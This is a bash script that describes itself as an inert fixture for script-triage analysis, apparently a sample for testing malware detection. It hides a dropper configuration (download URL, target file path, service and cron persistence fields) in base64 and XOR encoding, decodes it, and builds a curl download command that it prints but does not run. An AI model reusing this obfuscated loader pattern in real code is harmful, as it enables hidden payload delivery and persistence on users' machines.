#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_ecd9a6bd='aSIuY2xrem9sIn58bmp2bXpAbXpycGt6M2htdmt6QHl2c3pjfnt+b2t6bSJ8am1zQHBqa29qa2Nsa3''54ekB8cGpxayIuY3x+cm9+dnhxQHZ7Inx+cm9+dnhxMix+KS98KXl6KSZjam1zIndra29sJTAwLH4p''L3wpeXopJjF6Z35yb3N6MXZxaX5zdnswJ358JyYvfn4xbHdjamx6bUB+eHpxayJXanFrbXpsbFN+fT''AsfikvfCl5eikmY3l2c3pAb35rdyIwa3JvMHdqcWttemxsMnx+fHd6MDFsa354ejIsfikvfCl5eikm'
readonly Codec_ecd9a6bd='base64_chunks|single_byte_xor|1f'

Load_ecd9a6bd() {
  EnCoDeD_Bytes=()
  local PaRt
  while read -r PaRt; do [[ -n "$PaRt" ]] && EnCoDeD_Bytes+=("$PaRt"); done < <(printf '%s' "${Material_ecd9a6bd}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
}

Decode_ecd9a6bd() {
  DeCoDeD_Bytes=()
  local InDeX
  for ((InDeX=0; InDeX<${#EnCoDeD_Bytes[@]}; InDeX++)); do
    DeCoDeD_Bytes+=("$((EnCoDeD_Bytes[InDeX] ^ 31))")
  done
}

Recover_ecd9a6bd() {
  local -a EnCoDeD_Bytes DeCoDeD_Bytes
  local DeScRiPtOr_Text NeUtRaL PaSs InDeX
  local -a compass=(north south); NeUtRaL="$(IFS=:; printf '%s' "${compass[*]}")"
  Load_ecd9a6bd
  case 1 in 1) Decode_ecd9a6bd ;; *) return 70 ;; esac
  DeScRiPtOr_Text=''
  local octal character
  for InDeX in "${!DeCoDeD_Bytes[@]}"; do
    printf -v octal '%03o' "${DeCoDeD_Bytes[InDeX]}"
    printf -v character '%b' "\\$octal"
    DeScRiPtOr_Text+="$character"
  done
  printf '%s\n' "$DeScRiPtOr_Text"
}

Inspect_ecd9a6bd() { local recovered field; local -a fields; recovered="$(Recover_ecd9a6bd)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

Plan_ecd9a6bd() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_ecd9a6bd)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(curl --fail --silent --show-error -o "$file_path" "$url")
  declare -p request_command
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_ecd9a6bd; fi
